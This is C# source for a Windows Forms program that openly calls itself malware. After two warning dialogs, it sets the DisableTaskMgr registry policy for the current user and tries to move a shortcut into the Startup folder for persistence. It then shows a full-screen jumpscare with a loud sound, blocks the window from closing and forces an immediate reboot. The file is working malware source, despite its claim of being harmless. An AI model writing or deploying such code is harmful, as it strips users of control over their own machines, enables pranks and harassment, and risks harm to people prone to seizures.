﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Diagnostics.Eventing.Reader;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Media;
using System.Threading;
using Microsoft.Win32;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;

namespace Destructive
{
    public partial class Form1 : Form
    {
        public bool bolehclose = true;

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            DialogResult shit = MessageBox.Show("Attention! This is a malware or virus program that can disable Task Manager.\n\nDO YOU REALLY WANT TO EXECUTE OR OPEN THIS MALWARE/VIRUS? This malware also contains flashing lights and jumpscares. If you have a bad epilepsy, immediately close and delete this malware even if you are using your virtual machine.\n\nActually, this malware is not really harmful. It just disable your Task Manager and make your PC BSOD. But I still recommend running this only in a virtual machine to minimize damage to your PC.", "WARNING! This is the MALWARE Program!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (shit == DialogResult.Yes)
            {
                DialogResult shit2 = MessageBox.Show("Are you serious to run this malware/virus program? \nIf yes, The creator of this program is NOT RESPONSIBLE for any damages caused by this malware/virus program. If no, nothing will be happened. \n\nPlease read the README file for more info.\n\nDO NOT USE IT FOR PRANK AND CRIMINAL ACTIVITIES.", "ATTENTION, THIS IS THE FINAL WARNING!", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (shit2 == DialogResult.Yes)
                {
                    try
                    {
                        bolehclose = false;
                        RegistryKey regKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                        regKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                        regKey.Close();
                        string sourceFile = @"Virus GDI - Shortcut.lnk";
                        string destinationFile = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                        if (File.Exists(sourceFile))
                        {
                            File.Move(sourceFile, destinationFile);
                        }
                    }
                    finally
                    {
                        this.BackgroundImage = Destructive.Properties.Resources.Pocong;
                        this.TopMost = true;
                        this.FormBorderStyle = FormBorderStyle.None;
                        this.WindowState = FormWindowState.Maximized;
                        SoundPlayer sp = new SoundPlayer(@"WARNING! THE LOUDEST JUMPSCARE EVER!.wav");
                        sp.Play();
                        Process.Start("shutdown", "-r -t 2");
                    }
                }
                else if (shit2 == DialogResult.No)
                {
                    Application.ExitThread();
                }
            }
            else if (shit == DialogResult.No)
            {
                Application.ExitThread();
            }
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (bolehclose == false)
            {
                e.Cancel = true;
            }
        }
    }
}